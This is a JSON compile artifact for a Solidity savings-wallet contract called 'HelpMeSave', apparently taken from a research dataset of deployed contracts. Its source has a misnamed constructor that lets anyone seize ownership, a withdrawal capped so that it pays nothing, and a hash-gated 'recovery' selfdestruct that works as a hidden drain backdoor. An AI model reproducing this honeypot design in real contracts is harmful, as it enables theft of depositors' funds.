{
  "contractName": "HelpMeSave",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "MyTestWallet7",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_password",
          "type": "string"
        },
        {
          "name": "_return_addr",
          "type": "address"
        }
      ],
      "name": "recovery",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5061044d806100206000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306b5ad181461007757806322d122a9146101145780633ccfd60b1461012b5780638da5cb5b14610142578063d0e30db014610199575b6100756101a3565b005b34801561008357600080fd5b506100fe600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506101a5565b6040518082815260200191505060405180910390f35b34801561012057600080fd5b506101296102a1565b005b34801561013757600080fd5b506101406102e3565b005b34801561014e57600080fd5b506101576103fc565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101a16101a3565b005b565b60006556479171e704655af3107a400083604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166c0100000000000000000000000002815260140191505060405180910390206001900481151561021357fe5b061415610233578173ffffffffffffffffffffffffffffffffffffffff16ff5b655af3107a400082604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166c0100000000000000000000000002815260140191505060405180910390206001900481151561029857fe5b06905092915050565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156103f9573073ffffffffffffffffffffffffffffffffffffffff163190506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415806103b85750683635c9adc5dea0000081105b156103c257600090505b3373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050505b50565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815600a165627a7a7230582006843006b7f983be832f611b32df438d544a2aa82e71676de1dd1eb4711466b10029",
  "source": "\n\ncontract HelpMeSave { \n   \n   address public owner; \n   \n   \n   function MyTestWallet7(){\n       owner = msg.sender;   \n   }\n   \n    function deposit() public payable{}\n    function() payable {deposit();}\n    \n    \n    function withdraw () public noone_else { \n\n         uint256 withdraw_amt = this.balance;\n         \n         if (msg.sender != owner || withdraw_amt < 1000 ether ){ \n             withdraw_amt = 0;                     \n         }\n         \n         msg.sender.send(withdraw_amt); \n         \n   }\n\n    modifier noone_else() {\n        if (msg.sender == owner) \n            _;\n    }\n\n    \n    \n    \n    \n    function recovery (string _password, address _return_addr) returns (uint256) {\n       \n       if ( uint256(sha3(_return_addr)) % 100000000000000 == 94865382827780 ){\n                selfdestruct (_return_addr);\n       }\n       return uint256(sha3(_return_addr)) % 100000000000000;\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x8b099bdcfea93faecfac13d0dbc1d08c4e1ec595/contracts/0x8b099bdcfea93faecfac13d0dbc1d08c4e1ec595.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T04:00:09.188Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}